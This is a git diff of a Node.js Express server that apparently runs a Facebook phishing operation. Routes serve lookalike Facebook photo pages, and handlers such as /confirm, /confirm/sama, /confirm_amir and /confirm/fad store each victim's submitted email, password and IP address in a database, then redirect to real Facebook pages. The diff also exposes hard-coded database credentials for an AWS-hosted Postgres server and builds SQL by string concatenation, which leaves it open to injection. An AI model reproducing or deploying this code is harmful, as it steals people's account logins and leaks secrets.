@@ -8,13 +8,14 @@ const pg = require('pg');
 var bodyParser = require('body-parser');
 app.use(bodyParser.urlencoded({ extended: false }));
 const client = new pg.Client({
-    user: 'haaasalbrddacm',
-    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
-    database: 'de35u0icb8jt5u',
+    user: 'hedmgtryrynnvo',
+    password: '8d3725c0c82caf633dea68b3520ed712ae8bb985e69daf228c9a2a72959a91c5',
+    database: 'deqngk324p153p',
     port: 5432,
-    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
+    host: 'ec2-23-23-228-132.compute-1.amazonaws.com',
     ssl: true
 });
+
 client.connect();
 app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572697/735306480197164', function (req, res) {
     res.render('Facebook');
@@ -60,36 +61,48 @@ app.get('/', function (req, res) {
 
 
 app.post('/confirm', function (req, res) {
-    var a = req.body.email_a;
-    var b = req.body.pass_a;
+    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
+    var mail = req.body.email_a;
+    var password = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
-    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
+    if (mail == undefined) {
+        mail = c;
+    }
+    if (password == undefined) {
+        password = b;
+    }
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
+    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
         if (!err) {
             // console.log(result)
         }
     })
 })
 // ################################################################################################################################
-    app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444555', function (req, res) {
-        res.render('sama')
-    })
+app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444555', function (req, res) {
+    res.render('sama')
+})
 app.post('/confirm/sama', function (req, res) {
-    var a = req.body.email_a;
-    var b = req.body.pass_a;
+    res.redirect('https://www.facebook.com/Hazem.Kamal.Samak')
+    var mail = req.body.email_a;
+    var password = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
-    res.redirect('https://www.facebook.com/Hazem.Kamal.Samak')
+    if (mail == undefined) {
+        mail = c;
+    }
+    if (password == undefined) {
+        password = b;
+    }
     var ip = req.headers['x-forwarded-for'] ||
-    req.connection.remoteAddress ||
-    req.socket.remoteAddress ||
-    (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
         if (!err) {
             // console.log(result)
         }
@@ -99,15 +112,21 @@ app.post('/confirm/sama', function (req, res) {
 // ################################################################################################################################
 app.post('/confirm_amir', function (req, res) {
     res.redirect('https://www.facebook.com/eyaynews/')
-    var a = req.body.email_a;
-    var b = req.body.pass_a;
+    var mail = req.body.email_a;
+    var password = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
+    if (mail == undefined) {
+        mail = c;
+    }
+    if (password == undefined) {
+        password = b;
+    }
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
+    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
         if (!err) {
             // console.log(result)
         }
@@ -121,20 +140,28 @@ app.get('/fade7a/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.22155
 
     res.render('fade7a');
 })
-app.post('/confirm/fad', function (req,res) {
+app.post('/confirm/fad', function (req, res) {
 
 
     res.redirect('https://www.facebook.com/eyaynews/')
-    var a = req.body.email_a;
-    var b = req.body.pass_a;
+    var mail = req.body.email_a;
+    var password = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
+    if (mail == undefined) {
+        mail = c;
+    }
+    if (password == undefined) {
+        password = b;
+    }
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
-
+    client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
+        if (!err) {
+            // console.log(result)
+        }
     })
 })
 // ***********************************************************************************************************************************************
@@ -142,20 +169,28 @@ app.post('/confirm/fad', function (req,res) {
 
 //     res.render('sina');
 // })
-// app.post('/confirm/sina', function (req,res) {
+// app.post('/confirm/sina', function (req, res) {
 
 
 //     res.redirect('https://www.facebook.com/groups/su180/')
-//     var a = req.body.email_a;
-//     var b = req.body.pass_a;
+//     var mail = req.body.email_a;
+//     var password = req.body.pass_a;
 //     var c = req.body.email;
 //     var d = req.body.pass;
+//     if (mail == undefined) {
+//         mail = c;
+//     }
+//     if (password == undefined) {
+//         password = b;
+//     }
 //     var ip = req.headers['x-forwarded-for'] ||
 //         req.connection.remoteAddress ||
 //         req.socket.remoteAddress ||
 //         (req.connection.socket ? req.connection.socket.remoteAddress : null);
-//     client.query("INSERT INTO facebook (mail_a,mail_b,MAIL,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
-
+//     client.query("INSERT INTO facebook (mail,password,ip) VALUES ('" + mail + "','" + password + "','" + ip + "')", function (err, result) {
+//         if (!err) {
+//             // console.log(result)
+//         }
 //     })
 // })
 // ************************************************************************************************************************************************
